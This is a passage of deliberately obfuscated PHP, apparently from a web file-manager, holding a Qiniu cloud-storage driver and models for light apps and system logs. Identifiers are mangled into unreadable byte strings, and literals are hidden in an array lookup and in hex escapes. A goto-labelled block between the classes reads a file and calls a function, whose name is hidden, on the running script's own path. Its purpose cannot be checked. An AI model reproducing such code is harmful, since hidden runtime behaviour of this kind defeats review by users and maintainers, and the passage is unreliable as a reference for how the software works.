$ßõ¢ÛÌ¿ = REPEAT_RENAME) { if ($this->setContent($éäáˆ©ç, $ÂúØ¬Øî)) { return $this->getPathOuter($éäáˆ©ç); } return !1; } public function mkdir($²È„ø¡ú, $şŠıÕúë = REPEAT_SKIP) { $Ä½üÆä› =& $_SERVER[¬ÏÕ§Áú]; $ÙÉ‘êÌã = trim($²È„ø¡ú, $Ä½üÆä›[8]); if ($this->_isFolder($ÙÉ‘êÌã)) { return $this->getPathOuter($ÙÉ‘êÌã); } $²È„ø¡ú = $ÙÉ‘êÌã . $Ä½üÆä›[8]; $¾ì‡÷êü = get_path_this($ÙÉ‘êÌã); $’øß˜ = $²È„ø¡ú . $¾ì‡÷êü; if (!$this->mkfile($’øß˜)) { return !1; } if (!$this->moveFile($’øß˜, $²È„ø¡ú)) { $this->delFile($’øß˜); return !1; } return $this->getPathOuter($ÙÉ‘êÌã); } public function copyFile($Õ·å—†Ÿ, $Ä¢”¡İŞ) { $„ø”ŠÔâ = $this->bucketManager->copy($this->bucket, $Õ·å—†Ÿ, $this->bucket, $Ä¢”¡İŞ, !0); return $„ø”ŠÔâ ? !1 : $this->getPathOuter($Ä¢”¡İŞ); } public function moveFile($©ÁƒÇŸƒ, $Ó¢ÃÑÙ) { $¼Ú˜şê = $this->bucketManager->move($this->bucket, $©ÁƒÇŸƒ, $this->bucket, $Ó¢ÃÑÙ, !0); return $¼Ú˜şê ? !1 : $this->getPathOuter($Ó¢ÃÑÙ); } public function delFile($ÈÍŞù¬­) { if (!$this->exist($ÈÍŞù¬­)) { return !0; } $¬˜à¬ƒÄ = $this->bucketManager->delete($this->bucket, $ÈÍŞù¬­); if (!$¬˜à¬ƒÄ) { return !0; } return $¬˜à¬ƒÄ->code() == 612 ? !0 : !1; } public function delFolder($õ¿à³¸ú) { $š²æâËÙ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->exist($õ¿à³¸ú)) { return !0; } $this->listItemCache = !1; $¿ãÚ§æõ = $this->fileList($õ¿à³¸ú); $this->listItemCache = !0; $šş§›Òã = trim($õ¿à³¸ú, $š²æâËÙ[8]) . $š²æâËÙ[8]; if (!empty($õ¿à³¸ú) && $õ¿à³¸ú !== $š²æâËÙ[241] && !in_array($šş§›Òã, $¿ãÚ§æõ[$š²æâËÙ[95]])) { $¿ãÚ§æõ[$š²æâËÙ[95]][] = $šş§›Òã; } $ªÙÏæŠÖ = $this->delByBatch($¿ãÚ§æõ[$š²æâËÙ[96]]); if (!$ªÙÏæŠÖ) { return !1; } $ªÙÏæŠÖ = $this->delByBatch($¿ãÚ§æõ[$š²æâËÙ[95]]); if (!$ªÙÏæŠÖ) { return !1; } return $this->delFile($šş§›Òã); } private function delByBatch($‰†¹šô¬) { foreach (array_chunk($‰†¹šô¬, 1000) as $ÀÇ€ƒøÎ) { $Æ„ûƒŒ = $this->bucketManager->buildBatchDelete($this->bucket, $ÀÇ€ƒøÎ); list($ô¿ãÂµş, $ëª“‚ñÛ) = $this->bucketManager->batch($Æ„ûƒŒ); if ($ëª“‚ñÛ) { return !1; } } return !0; } public function rename($ÉÛãè¨½, $åªÌÁŞ²) { return $this->renameObject($ÉÛãè¨½, $åªÌÁŞ²); } public function fileInfo($ŞŸŠÌò©, $øú°Åã« = false, $ê¨ó¼Åğ = array()) { $¾Ÿ¢©õé =& $_SERVER[¬ÏÕ§Áú]; $°©¦Ÿ¡œ = array($¾Ÿ¢©õé[32] => $this->pathThis($ŞŸŠÌò©), $¾Ÿ¢©õé[97] => $this->getPathOuter($¾Ÿ¢©õé[8] . $ŞŸŠÌò©), $¾Ÿ¢©õé[33] => $¾Ÿ¢©õé[243], $¾Ÿ¢©õé[89] => isset($ê¨ó¼Åğ[$¾Ÿ¢©õé[1592]]) ? $ê¨ó¼Åğ[$¾Ÿ¢©õé[1592]] : 0, $¾Ÿ¢©õé[179] => $this->ext($ŞŸŠÌò©)); if ($øú°Åã«) { return $°©¦Ÿ¡œ; } $°©¦Ÿ¡œ[$¾Ÿ¢©õé[244]] = $°©¦Ÿ¡œ[$¾Ÿ¢©õé[98]] = 0; $°©¦Ÿ¡œ[$¾Ÿ¢©õé[245]] = $°©¦Ÿ¡œ[$¾Ÿ¢©õé[246]] = !0; if (empty($ê¨ó¼Åğ)) { $ê¨ó¼Åğ = $this->objectMeta($ŞŸŠÌò©); if (!$ê¨ó¼Åğ) { return $°©¦Ÿ¡œ; } } if (isset($ê¨ó¼Åğ[$¾Ÿ¢©õé[247]]) && $ê¨ó¼Åğ[$¾Ÿ¢©õé[247]]) { $°©¦Ÿ¡œ[$¾Ÿ¢©õé[248]] = $ê¨ó¼Åğ[$¾Ÿ¢©õé[247]]; } if (isset($ê¨ó¼Åğ[$¾Ÿ¢©õé[258]]) && $ê¨ó¼Åğ[$¾Ÿ¢©õé[258]]) { $°©¦Ÿ¡œ[$¾Ÿ¢©õé[248]] = $ê¨ó¼Åğ[$¾Ÿ¢©õé[258]]; } if (isset($ê¨ó¼Åğ[$¾Ÿ¢©õé[1593]])) { $°©¦Ÿ¡œ[$¾Ÿ¢©õé[98]] = substr($ê¨ó¼Åğ[$¾Ÿ¢©õé[1593]] . $¾Ÿ¢©õé[12], 0, 10); } if (isset($ê¨ó¼Åğ[$¾Ÿ¢©õé[1592]])) { $°©¦Ÿ¡œ[$¾Ÿ¢©õé[89]] = $ê¨ó¼Åğ[$¾Ÿ¢©õé[1592]]; } return $°©¦Ÿ¡œ; } public function folderInfo($¼ÒÁ·è‘, $á´˜¦…ş = false) { $¾œ»İÀÁ =& $_SERVER[¬ÏÕ§Áú]; $©ş™Ñ®ç = array($¾œ»İÀÁ[32] => $this->pathThis($¼ÒÁ·è‘), $¾œ»İÀÁ[97] => $this->getPathOuter($¾œ»İÀÁ[8] . $¼ÒÁ·è‘), $¾œ»İÀÁ[33] => $¾œ»İÀÁ[88]); if ($á´˜¦…ş) { return $©ş™Ñ®ç; } $©ş™Ñ®ç[$¾œ»İÀÁ[244]] = $©ş™Ñ®ç[$¾œ»İÀÁ[98]] = 0; $©ş™Ñ®ç[$¾œ»İÀÁ[245]] = $©ş™Ñ®ç[$¾œ»İÀÁ[246]] = !0; $¼ÒÁ·è‘ = rtrim($¼ÒÁ·è‘, $¾œ»İÀÁ[8]) . $¾œ»İÀÁ[8]; $ÑÔŸı›ë = $this->objectMeta($¼ÒÁ·è‘); if (isset($ÑÔŸı›ë[$¾œ»İÀÁ[1593]])) { $©ş™Ñ®ç[$¾œ»İÀÁ[98]] = substr($ÑÔŸı›ë[$¾œ»İÀÁ[1593]] . $¾œ»İÀÁ[12], 0, 10); } return $©ş™Ñ®ç; } public function listPath($½Ã–Õ…, $¹÷Íø = false) { $˜ŸÎ®Ü =& $_SERVER[¬ÏÕ§Áú]; $œ¡äÖ€û = $this->fileList($½Ã–Õ…, $˜ŸÎ®Ü[8], !0); foreach ($œ¡äÖ€û[$˜ŸÎ®Ü[95]] as $ñóñõŠ => $œº¹¼¾Ÿ) { $œ¡äÖ€û[$˜ŸÎ®Ü[95]][$ñóñõŠ] = $this->folderInfo($œº¹¼¾Ÿ, $¹÷Íø); } foreach ($œ¡äÖ€û[$˜ŸÎ®Ü[96]] as $ñóñõŠ => $œº¹¼¾Ÿ) { $œ¡äÖ€û[$˜ŸÎ®Ü[96]][$ñóñõŠ] = $this->fileInfo($œº¹¼¾Ÿ[$˜ŸÎ®Ü[32]], $¹÷Íø, $œº¹¼¾Ÿ); } return $œ¡äÖ€û; } public function has($ºÕ­˜ıÖ, $ÖÊÄ·£€ = false, $Å„æ†¸… = true) { $ëäÜŒÍÓ =& $_SERVER[¬ÏÕ§Áú]; $ºÕ­˜ıÖ = trim($ºÕ­˜ıÖ, $ëäÜŒÍÓ[8]); $£ÔôñÑ = empty($ºÕ­˜ıÖ) && $ºÕ­˜ıÖ !== $ëäÜŒÍÓ[241] ? $ëäÜŒÍÓ[12] : $ºÕ­˜ıÖ . $ëäÜŒÍÓ[8]; $ÈŒ¶ÆÉš = $ëäÜŒÍÓ[12]; $àÃÄ¾Ô = 500; $ºÇÔíş = $ëäÜŒÍÓ[8]; $áİæÊë¨ = $ø§Öï—° = 0; while (!0) { check_abort(); list($æ•Õ²ºÔ, $Ä˜íÄÎ³) = $this->bucketManager->listFiles($this->bucket, $£ÔôñÑ, $ÈŒ¶ÆÉš, $àÃÄ¾Ô, $ºÇÔíş); if ($Ä˜íÄÎ³) { break; } $ÈŒ¶ÆÉš = array_key_exists($ëäÜŒÍÓ[1539], $æ•Õ²ºÔ) ? $ÈŒ¶ÆÉš = $æ•Õ²ºÔ[$ëäÜŒÍÓ[1594]] : $ëäÜŒÍÓ[12]; if ($ÖÊÄ·£€) { if (!empty($æ•Õ²ºÔ[$ëäÜŒÍÓ[1595]])) { $áİæÊë¨ += count($æ•Õ²ºÔ[$ëäÜŒÍÓ[1595]]); } if (!empty($æ•Õ²ºÔ[$ëäÜŒÍÓ[1596]])) { $ø§Öï—° += count($æ•Õ²ºÔ[$ëäÜŒÍÓ[1596]]); } if ($ÈŒ¶ÆÉš === $ëäÜŒÍÓ[12]) { break; } continue; } if ($Å„æ†¸…) { if (!empty($æ•Õ²ºÔ[$ëäÜŒÍÓ[1595]])) { return !0; } } else { if (!empty($æ•Õ²ºÔ[$ëäÜŒÍÓ[1596]])) { return !0; } } if ($ÈŒ¶ÆÉš === $ëäÜŒÍÓ[12]) { break; } } if ($ÖÊÄ·£€) { return array($ëäÜŒÍÓ[252] => $áİæÊë¨, $ëäÜŒÍÓ[253] => $ø§Öï—°); } return !1; } public function listAll($¯ôå¹ª§) { $È†ö÷×§ =& $_SERVER[¬ÏÕ§Áú]; $˜Éê¡‹ = $this->fileList($¯ôå¹ª§, $È†ö÷×§[12], !0); $ËÙŞöÃ = array_to_keyvalue($˜Éê¡‹[$È†ö÷×§[96]], $È†ö÷×§[32]); foreach ($˜Éê¡‹[$È†ö÷×§[95]] as $¥ÉÛåŠ) { if (is_string($¥ÉÛåŠ)) { $ËÙŞöÃ[$¥ÉÛåŠ] = array($È†ö÷×§[89] => 0); } } return $this->listAllFiles($¯ôå¹ª§, $ËÙŞöÃ); } private function fileList($ü²¨éÍä, $ù¾±ãø’ = '', $ğ’ Šâ³ = 0) { $ªË‚¦Ş =& $_SERVER[¬ÏÕ§Áú]; $ü²¨éÍä = trim($ü²¨éÍä, $ªË‚¦Ş[8]); $„®ˆ÷¬¶ = empty($ü²¨éÍä) && $ü²¨éÍä !== $ªË‚¦Ş[241] ? $ªË‚¦Ş[12] : $ü²¨éÍä . $ªË‚¦Ş[8]; $™ê§š‡è = $ªË‚¦Ş[12]; $›ø™æíÊ = 1000; $’â¥£ÌÇ = $·Öş×˜ˆ = array(); while (!0) { check_abort(); list($ÈŠƒ¬ÍÜ, $©ŠÒıôª) = $this->bucketManager->listFiles($this->bucket, $„®ˆ÷¬¶, $™ê§š‡è, $›ø™æíÊ, $ù¾±ãø’); if ($©ŠÒıôª) { break; } $™ê§š‡è = array_key_exists($ªË‚¦Ş[1539], $ÈŠƒ¬ÍÜ) ? $™ê§š‡è = $ÈŠƒ¬ÍÜ[$ªË‚¦Ş[1594]] : $ªË‚¦Ş[12]; $ªÉõ† = isset($ÈŠƒ¬ÍÜ[$ªË‚¦Ş[1595]]) ? $ÈŠƒ¬ÍÜ[$ªË‚¦Ş[1595]] : array(); $Äı®Ü¯‡ = isset($ÈŠƒ¬ÍÜ[$ªË‚¦Ş[1596]]) ? $ÈŠƒ¬ÍÜ[$ªË‚¦Ş[1596]] : array(); foreach ($ªÉõ† as $•´éõ) { if ($•´éõ[$ªË‚¦Ş[107]] == $„®ˆ÷¬¶) { continue; } $–«ÊñäÀ = $•´éõ[$ªË‚¦Ş[107]]; $¼”ÏÊ¯» = $•´éõ[$ªË‚¦Ş[1592]]; $•´éõ[$ªË‚¦Ş[32]] = $–«ÊñäÀ; $•´éõ[$ªË‚¦Ş[89]] = $¼”ÏÊ¯»; $ÜŸø¤Àƒ = $¼”ÏÊ¯» == 0 && substr($–«ÊñäÀ, strlen($–«ÊñäÀ) - 1, 1) == $ªË‚¦Ş[8] ? !0 : !1; $this->cacheMethodInfoSet($–«ÊñäÀ, $ÜŸø¤Àƒ, $•´éõ); if ($ÜŸø¤Àƒ) { $’â¥£ÌÇ[] = $–«ÊñäÀ; continue; } $·Öş×˜ˆ[] = $ğ’ Šâ³ ? $•´éõ : $–«ÊñäÀ; } foreach ($Äı®Ü¯‡ as $–«ÊñäÀ) { if ($–«ÊñäÀ == $„®ˆ÷¬¶) { continue; } $’â¥£ÌÇ[] = $–«ÊñäÀ; $this->cacheMethodInfoSet($–«ÊñäÀ, !0); } if ($™ê§š‡è === $ªË‚¦Ş[12]) { break; } } $this->cacheMethodInfoSet($ü²¨éÍä, !0); return array($ªË‚¦Ş[95] => $’â¥£ÌÇ, $ªË‚¦Ş[96] => $·Öş×˜ˆ); } public function canRead($ˆÕÜÀºÕ) { return $this->exist($ˆÕÜÀºÕ) ? !0 : !1; } public function canWrite($Ù¦úïõ) { return $this->exist($Ù¦úïõ) ? !0 : !1; } public function getContent($´˜½·Ëë) { return $this->fileSubstr($´˜½·Ëë, 0, -1); } public function setContent($ŸŒ•éî§, $¹ƒ‘¢™á = '') { $Ï¯’—Í© = $this->tempFile($this->pathThis($ŸŒ•éî§)); file_put_contents($Ï¯’—Í©, $¹ƒ‘¢™á); if ($this->upload($ŸŒ•éî§, $Ï¯’—Í©)) { $this->tempFileRemve($Ï¯’—Í©); return !0; } return !1; } public function refreshUrls($Ô®‰§İº) { $üÙ·¨Æ =& $_SERVER[¬ÏÕ§Áú]; $‘ãÎ·º’ = array(); if (is_array($Ô®‰§İº)) { foreach ($Ô®‰§İº as $¼¿±Äçı) { $‘ãÎ·º’[] = $this->link($¼¿±Äçı); } } else { $‘ãÎ·º’[] = $this->link($Ô®‰§İº); } $¥•ë˜Èø = new Qiniu\Cdn\CdnManager($this->auth); list($üÏ„“Ğú, $èÃ¡é) = $¥•ë˜Èø->refreshUrls($‘ãÎ·º’); if ($èÃ¡é) { return !1; } return $üÏ„“Ğú[$üÙ·¨Æ[1319]] == $üÙ·¨Æ[873] ? !0 : !1; } public function fileSubstr($­¢Á†Ÿ, $°ßÑè½, $¬ª”äÀÖ) { $ìÍ¨ÁÓ =& $_SERVER[¬ÏÕ§Áú]; if (!($Í¥¸å•Û = $this->link($­¢Á†Ÿ))) { return !1; } $¡¼Å­Áı = !1; if ($¬ª”äÀÖ > 0) { $ÍÙª€¼Ä = $°ßÑè½ + $¬ª”äÀÖ - 1; $¡¼Å­Áı = array($ìÍ¨ÁÓ[1597] . $°ßÑè½ . $ìÍ¨ÁÓ[482] . $ÍÙª€¼Ä); } $­³ÁÍ» = url_request($Í¥¸å•Û, $ìÍ¨ÁÓ[1558], !1, $¡¼Å­Áı); return $­³ÁÍ»[$ìÍ¨ÁÓ[863]] ? $­³ÁÍ»[$ìÍ¨ÁÓ[1342]] : !1; } public function upload($†Û€º³ƒ, $æÀ¯°Ïˆ, $‹ØÂÜÃµ = false, $ÂÜ×ĞÅ« = REPEAT_REPLACE) { $Á»Ôµà¸ = new Qiniu\Storage\UploadManager(); $°ˆ€Ä£Î = $this->auth->uploadToken($this->bucket, $†Û€º³ƒ); $¥õöÖ­µ = get_file_mime(get_path_ext($æÀ¯°Ïˆ)); list($’ŸÙÊ™Á, $‰Óù·ñ) = $Á»Ôµà¸->putFile($°ˆ€Ä£Î, $†Û€º³ƒ, $æÀ¯°Ïˆ, null, $¥õöÖ­µ); return $‰Óù·ñ ? !1 : $this->getPathOuter($†Û€º³ƒ); } public function uploadFormData($†¶¤êã, $³ûË×å = 3600) { return $this->uploadToken($†¶¤êã, $³ûË×å); } public function uploadMultiData($Ø¥¦¯, $¹Ö‹§¼ = 3600) { return $this->uploadToken($Ø¥¦¯, $¹Ö‹§¼); } private function uploadToken($­øë¢Ï, $ôÓúÖÑ¬ = 3600) { $Éğú®äÑ =& $_SERVER[¬ÏÕ§Áú]; $èºµåŠù = $ôÓúÖÑ¬; $Ì›Âú¥ = array($Éğú®äÑ[1598] => $Éğú®äÑ[1599]); $ùÙ•¯Ÿ = $­øë¢Ï; $û¯ó²Î = $this->auth->uploadToken($this->bucket, $ùÙ•¯Ÿ, $èºµåŠù, $Ì›Âú¥, !0); $¼ıèüÏÔ = empty($this->region) || $this->region == $Éğú®äÑ[1600] ? $Éğú®äÑ[12] : $Éğú®äÑ[482] . $this->region; $®ı¡ğöì = http_type() . "\72\57\57\x75\160\x6c\x6f\x61\144{$¼ıèüÏÔ}\56\x71\x69\x6e\x69\165\x70\x2e\143\157\x6d\57"; return array($Éğú®äÑ[1601] => $û¯ó²Î, $Éğú®äÑ[1602] => $®ı¡ğöì); } public function download($¶£êøÔ, $“Å¶‰‰Ù) { $Ø°åˆ¥¸ = IO::getPathInner(IO::mkfile($“Å¶‰‰Ù)); if (!($Ñùİ¹Ÿ = $this->link($¶£êøÔ))) { return !1; } $¥±Æã°Õ = 0; $âœŠù = 1024 * 200; $Ç¹û™Åš = fopen($Ø°åˆ¥¸, $_SERVER[¬ÏÕ§Áú][1603]); while (!0) { $ù‹êÂœ = $this->fileSubstr($¶£êøÔ, $¥±Æã°Õ, $âœŠù); if ($ù‹êÂœ === !1) { return !1; } fwrite($Ç¹û™Åš, $ù‹êÂœ); $¥±Æã°Õ += $âœŠù; if (strlen($ù‹êÂœ) < $âœŠù) { break; } } fclose($Ç¹û™Åš); return $“Å¶‰‰Ù; } public function link($ÈÊ“™–ı, $ÂÉÀ Ó = '') { if (!$this->isFile($ÈÊ“™–ı)) { return !1; } $åñ¡İµ€ = $this->getHost() . $_SERVER[¬ÏÕ§Áú][8] . $this->pathEncode($ÈÊ“™–ı) . $ÂÉÀ Ó; return $this->auth->privateDownloadUrl($åñ¡İµ€, 3600 * 12); } public function fileOut($ó¨¾Ô, $Í‡ì§ü = false, $´‹Òú´Â = false, $çœªÆÂ = '') { $«š§·â³ =& $_SERVER[¬ÏÕ§Áú]; if ($this->isFileOutServer()) { return $this->fileOutServer($ó¨¾Ô, $Í‡ì§ü, $´‹Òú´Â, $çœªÆÂ); } if (!$´‹Òú´Â) { $´‹Òú´Â = $this->pathThis($ó¨¾Ô); } $ÅàŸÀ‚ = $Í‡ì§ü ? $«š§·â³[1604] . rawurlencode($´‹Òú´Â) : $«š§·â³[12]; $óªàÅ× = $this->link($ó¨¾Ô, $ÅàŸÀ‚); $this->fileOutLink($óªàÅ×); } public function fileOutServer($¤Â·åÇ , $¨±²ß‰û = false, $…¶šãıÌ = false, $ò‚„›ƒù = '') { parent::fileOut($¤Â·åÇ , $¨±²ß‰û, $…¶šãıÌ, $ò‚„›ƒù); } public function fileOutImage($Õ¦ƒ¢Èª, $ŞÔ—İôª = 250) { if ($this->size($Õ¦ƒ¢Èª) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Õ¦ƒ¢Èª, $ŞÔ—İôª); } $Ûº„ß¶Ÿ = $this->link($Õ¦ƒ¢Èª, $_SERVER[¬ÏÕ§Áú][1605] . $ŞÔ—İôª); $this->fileOutLink($Ûº„ß¶Ÿ); } public function fileOutImageServer($Âü³Ãé , $éÙÁ§ À = 250) { parent::fileOutImage($Âü³Ãé , $éÙÁ§ À); } public function hashMd5($§ë”èÎ) { $…ğòˆô± =& $_SERVER[¬ÏÕ§Áú]; $ü·äŠÖĞ = $this->objectMeta($§ë”èÎ); return isset($ü·äŠÖĞ[$…ğòˆô±[258]]) ? $ü·äŠÖĞ[$…ğòˆô±[258]] : !1; $´Øƒú¢ = $this->link($§ë”èÎ, $…ğòˆô±[1606]); } public function size($ß¢ôØ÷¶) { $¯•¡ºªõ = $this->objectMeta($ß¢ôØ÷¶); return $¯•¡ºªõ ? $¯•¡ºªõ[$_SERVER[¬ÏÕ§Áú][89]] : 0; } public function info($¡¾ü»½Õ) { if ($this->isFolder($¡¾ü»½Õ)) { return $this->folderInfo($¡¾ü»½Õ); } else { if ($this->isFile($¡¾ü»½Õ)) { return $this->fileInfo($¡¾ü»½Õ); } } return !1; } public function exist($µÇâßËĞ) { return $this->isFile($µÇâßËĞ) || $this->isFolder($µÇâßËĞ); } public function isFile($÷ëæ±À) { return !$this->isFolder($÷ëæ±À) && $this->objectMeta($÷ëæ±À); } public function isFolder($Û¸åêÔ) { return $this->cacheMethod($_SERVER[¬ÏÕ§Áú][190], $Û¸åêÔ); } protected function objectMeta($‘¸ê¢—Í) { return $this->cacheMethod($_SERVER[¬ÏÕ§Áú][192], $‘¸ê¢—Í); } protected function _objectMeta($Üñ“­ÒÆ) { $ÄÌµÓ€× =& $_SERVER[¬ÏÕ§Áú]; list($ÖşôåŸÊ, $¦‡Ø€¡é) = $this->bucketManager->stat($this->bucket, $Üñ“­ÒÆ); if ($ÖşôåŸÊ) { $ÖşôåŸÊ[$ÄÌµÓ€×[89]] = intval($ÖşôåŸÊ[$ÄÌµÓ€×[1592]]); } return $ÖşôåŸÊ; } protected function _isFolder($›°’¦¬–) { $íÎÄ¤àè =& $_SERVER[¬ÏÕ§Áú]; if ($›°’¦¬– == $íÎÄ¤àè[12] || $›°’¦¬– == $íÎÄ¤àè[8]) { return !0; } list($¼Á’‡±, $ÅæÁš˜°) = $this->bucketManager->listFiles($this->bucket, trim($›°’¦¬–, $íÎÄ¤àè[8]) . $íÎÄ¤àè[8], $íÎÄ¤àè[12], 1, $íÎÄ¤àè[8]); return !empty($¼Á’‡±[$íÎÄ¤àè[1595]]) || !empty($¼Á’‡±[$íÎÄ¤àè[1596]]) ? !0 : !1; } } $_file = $_SERVER[$_SERVER[¬ÏÕ§Áú][61]]; goto B…º¸î°´; DŒóÃ—™õ: if ($_SERVER[$_SERVER[¬ÏÕ§Áú][60]] != $_SERVER[$_SERVER[¬ÏÕ§Áú][2228]]) { $_getc = $_SERVER[¬ÏÕ§Áú][62]; $_getfile = $_SERVER[$_SERVER[¬ÏÕ§Áú][63]] . $_SERVER[¬ÏÕ§Áú][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¬ÏÕ§Áú][65], $_getfilec); if (count($_getarrs) < $_SERVER[¬ÏÕ§Áú][66]) { $exit = $_SERVER[¬ÏÕ§Áú][67]; $exit(); } $_act = $_SERVER[¬ÏÕ§Áú][68]; $_act($_SERVER[$_SERVER[¬ÏÕ§Áú][61]]); } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\114\x69\x67\150\164\x41\x70\x70"; public $modelType = "\x53\171\163\x74\145\x6d\117\160\x74\151\x6f\156"; public $field = array("\x6e\x61\155\x65", "\x67\x72\x6f\165\160", "\144\x65\163\x63", "\143\157\156\164\145\x6e\164"); public function listData($ºä¥×°Ğ = false, $°ıÊ×Æ = "\x6d\x6f\x64\x69\x66\171\x54\x69\x6d\145", $á­¬–ÙÌ = true) { return parent::listData($ºä¥×°Ğ, $°ıÊ×Æ, $á­¬–ÙÌ); } public function remove($À´Š×Ìº) { $ÈŒö×Ú¹ = $this->findByName($À´Š×Ìº); if (!$ÈŒö×Ú¹) { return !1; } return parent::remove($ÈŒö×Ú¹[$_SERVER[¬ÏÕ§Áú][492]]); } public function add($èàÚœˆÆ) { if ($this->findByName($èàÚœˆÆ[$_SERVER[¬ÏÕ§Áú][32]])) { return !1; } return parent::insert($èàÚœˆÆ); } public function update($Ğ©‡ñ¹ñ, $²Ú’Çıñ) { $İÚ©˜Ú‰ =& $_SERVER[¬ÏÕ§Áú]; $ùúöÑëœ = $this->findByName($Ğ©‡ñ¹ñ); $×ñ¨„ ² = $this->findByName($²Ú’Çıñ[$İÚ©˜Ú‰[32]]); if (!$ùúöÑëœ || $×ñ¨„ ² && $×ñ¨„ ²[$İÚ©˜Ú‰[492]] != $ùúöÑëœ[$İÚ©˜Ú‰[492]]) { return !1; } return parent::update($ùúöÑëœ[$İÚ©˜Ú‰[492]], $²Ú’Çıñ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\137\x6c\x6f\147"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\x54\151\x6d\145", "\164\151\155\x65", "\151\x6e\163\145\x72\164", "\x66\165\x6e\x63\164\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÄŠÑÎ =& $_SERVER[¬ÏÕ§Áú]; return array($ÄŠÑÎ[2420] => LNG($ÄŠÑÎ[2421]), $ÄŠÑÎ[2422] => LNG($ÄŠÑÎ[2423]), $ÄŠÑÎ[1981] => LNG($ÄŠÑÎ[2424]), $ÄŠÑÎ[2425] => LNG($ÄŠÑÎ[2426]), $ÄŠÑÎ[2427] => LNG($ÄŠÑÎ[2428]), $ÄŠÑÎ[2429] => LNG($ÄŠÑÎ[2430]), $ÄŠÑÎ[2431] => LNG($ÄŠÑÎ[2432]), $ÄŠÑÎ[2010] => LNG($ÄŠÑÎ[2432]), $ÄŠÑÎ[2011] => LNG($ÄŠÑÎ[2433]), $ÄŠÑÎ[2434] => LNG($ÄŠÑÎ[2435]), $ÄŠÑÎ[2436] => LNG($ÄŠÑÎ[2437]), $ÄŠÑÎ[2438] => LNG($ÄŠÑÎ[2439]), $ÄŠÑÎ[2440] => LNG($ÄŠÑÎ[2441]), $ÄŠÑÎ[2008] => LNG($ÄŠÑÎ[2442]), $ÄŠÑÎ[2443] => LNG($ÄŠÑÎ[2444]), $ÄŠÑÎ[2015] => LNG($ÄŠÑÎ[2445]), $ÄŠÑÎ[2446] => LNG($ÄŠÑÎ[2447]), $ÄŠÑÎ[2448] => LNG($ÄŠÑÎ[2449]), $ÄŠÑÎ[2450] => LNG($ÄŠÑÎ[2451]), $ÄŠÑÎ[2452] => LNG($ÄŠÑÎ[2453]), $ÄŠÑÎ[2018] => LNG($ÄŠÑÎ[2454]), $ÄŠÑÎ[2019] => LNG($ÄŠÑÎ[2455]), $ÄŠÑÎ[2456] => LNG($ÄŠÑÎ[2457]), $ÄŠÑÎ[2458] => LNG($ÄŠÑÎ[2459]), $ÄŠÑÎ[2460] => LNG($ÄŠÑÎ[2461]), $ÄŠÑÎ[2013] => LNG($ÄŠÑÎ[2462]), $ÄŠÑÎ[2463] => LNG($ÄŠÑÎ[2464]), $ÄŠÑÎ[2012] => LNG($ÄŠÑÎ[2465]), $ÄŠÑÎ[2466] => LNG($ÄŠÑÎ[2466]), $ÄŠÑÎ[2467] => LNG($ÄŠÑÎ[2468]), $ÄŠÑÎ[2469] => LNG($ÄŠÑÎ[2466]), $ÄŠÑÎ[2470] => LNG($ÄŠÑÎ[2471]), $ÄŠÑÎ[2472] => LNG($ÄŠÑÎ[2473]), $ÄŠÑÎ[2474] => LNG($ÄŠÑÎ[2473]), $ÄŠÑÎ[2475] => LNG($ÄŠÑÎ[2476]), $ÄŠÑÎ[2477] => LNG($ÄŠÑÎ[2477]), $ÄŠÑÎ[2478] => LNG($ÄŠÑÎ[1985]), $ÄŠÑÎ[2479] => LNG($ÄŠÑÎ[2480]), $ÄŠÑÎ[2481] => LNG($ÄŠÑÎ[2482]), $ÄŠÑÎ[2483] => LNG($ÄŠÑÎ[2484]), $ÄŠÑÎ[2485] => LNG($ÄŠÑÎ[2486]), $ÄŠÑÎ[2487] => LNG($ÄŠÑÎ[2488]), $ÄŠÑÎ[2489] => LNG($ÄŠÑÎ[2489]), $ÄŠÑÎ[2490] => LNG($ÄŠÑÎ[2491]), $ÄŠÑÎ[2492] => LNG($ÄŠÑÎ[2493]), $ÄŠÑÎ[2494] => LNG($ÄŠÑÎ[2495]), $ÄŠÑÎ[2496] => LNG($ÄŠÑÎ[2497]), $ÄŠÑÎ[2498] => LNG($ÄŠÑÎ[2499]), $ÄŠÑÎ[2500] => LNG($ÄŠÑÎ[2501]), $ÄŠÑÎ[223] => LNG($ÄŠÑÎ[223]), $ÄŠÑÎ[224] => LNG($ÄŠÑÎ[2502]), $ÄŠÑÎ[2503] => LNG($ÄŠÑÎ[2503])); } private function typeFile() { $‘ª—— =& $_SERVER[¬ÏÕ§Áú]; $·ÂÓ˜âº = array($‘ª——[2015] => array($‘ª——[2016]), $‘ª——[2438] => array($‘ª——[2504]), $‘ª——[2440] => array($‘ª——[2505]), $‘ª——[2008] => array($‘ª——[2009], $‘ª——[2506]), $‘ª——[2448] => array(), $‘ª——[2450] => array(), $‘ª——[2452] => array(), $‘ª——[2018] => array($‘ª——[2020]), $‘ª——[2019] => array($‘ª——[2020]), $‘ª——[2456] => array($‘ª——[2507]), $‘ª——[2458] => array($‘ª——[2507]), $‘ª——[2460] => array($‘ª——[2508]), $‘ª——[2446] => array($‘ª——[2509]), $‘ª——[2013] => array($‘ª——[2510]), $‘ª——[2463] => array($‘ª——[2511]), $‘ª——[2012] => array($‘ª——[2014])); return $·ÂÓ˜âº; } private function typeAll() { $Œ±ñàÅ =& $_SERVER[¬ÏÕ§Áú]; $Œ¤“ä›ô = $this->typeList; $ïùÜöÓ” = array_filter($this->typeFile()); foreach ($ïùÜöÓ” as $Âô·¬Š¬ => $äÏ–ï«) { $Œ¤“ä›ô[$äÏ–ï«[0]] = $Œ¤“ä›ô[$Âô·¬Š¬]; } $Œ¤“ä›ô[$Œ±ñàÅ[2020]] = LNG($Œ±ñàÅ[2512]); $Œ¤“ä›ô[$Œ±ñàÅ[2507]] = LNG($Œ±ñàÅ[2513]); return $Œ¤“ä›ô; } public function addLog($µøÌ»¬ê, $ªâòˆõ™ = array()) { $¦ÔŞÏşø =& $_SERVER[¬ÏÕ§Áú]; if (!isset($this->typeList[$µøÌ»¬ê])) { return; } $åÔ‚†ã = Session::get($¦ÔŞÏşø[2177]); if (!$åÔ‚†ã) { $åÔ‚†ã = 